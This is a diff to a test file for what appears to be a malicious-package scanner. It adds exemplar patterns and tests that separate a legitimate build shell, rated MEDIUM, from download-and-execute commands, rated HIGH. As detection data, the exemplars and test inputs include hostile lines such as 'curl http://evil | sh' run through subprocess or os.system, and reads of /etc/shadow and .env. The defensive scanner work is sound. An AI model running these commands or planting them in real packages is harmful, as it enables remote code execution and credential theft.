@@ -95,8 +95,12 @@ EXEMPLARS = {
     "System credential file access":               "open('/etc/shadow')",
     ".env file access":                            "fs.readFileSync('.env')",
     "Shell exec with string literal":              "exec('curl http://evil')",
-    "Subprocess spawning downloader/shell in package":
-                                                    "subprocess.run(['bash', '-c', 'x'])",
+    "Subprocess spawning network downloader in package":
+                                                    "subprocess.run(['curl', 'http://evil/x'])",
+    "Subprocess spawning shell with download/pipe/remote payload":
+                                                    "subprocess.run(['bash', '-c', 'curl http://evil | sh'])",
+    "Subprocess spawning shell interpreter in package (build step?)":
+                                                    "subprocess.check_call(['sh', './autogen.sh'])",
     "os.system with dangerous command in setup":   "os.system('curl http://evil | sh')",
     "Dynamic os import (obfuscation pattern)":      "mod = __import__('os')",
     "atexit hook registered (check if in setup/install script)":
@@ -135,6 +139,29 @@ def test_every_pattern_matches_its_exemplar(guard):
         "Some patterns failed to match their own exemplar — regex typo?\n"
         + "\n".join(f"  desc={d!r} pattern={p!r} exemplar={e!r}" for d, p, e in not_found)
     )
+
+
+# ─── Subprocess intent split (matplotlib calibration regression guard) ────────
+# setupext.py runs `subprocess.check_call(["sh", "./autogen.sh"])` — a legit
+# native-extension build. It must surface as MEDIUM, never HIGH; the real
+# download-pipe-execute TTP must stay HIGH. See docs/DESIGN.md § 2.9.
+
+def test_bare_build_shell_is_medium_not_high(guard):
+    hits = guard.scan_text('subprocess.check_call(["sh", "./autogen.sh"], cwd=src)')
+    shell = [(d, r) for d, r, _ in hits if d.startswith("Subprocess spawning shell")]
+    assert shell, "a bare build-shell should still surface a finding"
+    assert all(r == "MEDIUM" for _, r in shell), f"build shell must be MEDIUM, got {shell}"
+
+
+def test_download_pipe_shell_is_high(guard):
+    hits = guard.scan_text('subprocess.run(["bash", "-c", "curl http://evil | sh"])')
+    assert any(r == "HIGH" for d, r, _ in hits), f"download-pipe shell must be HIGH: {hits}"
+
+
+def test_subprocess_curl_downloader_is_high(guard):
+    hits = guard.scan_text('subprocess.run(["curl", "https://evil/x", "-o", "p"])')
+    assert any(r == "HIGH" and "downloader" in d for d, r, _ in hits), \
+        f"curl downloader must be HIGH: {hits}"
 
 
 # ─── Dedup-by-(desc, risk) ────────────────────────────────────────────────────
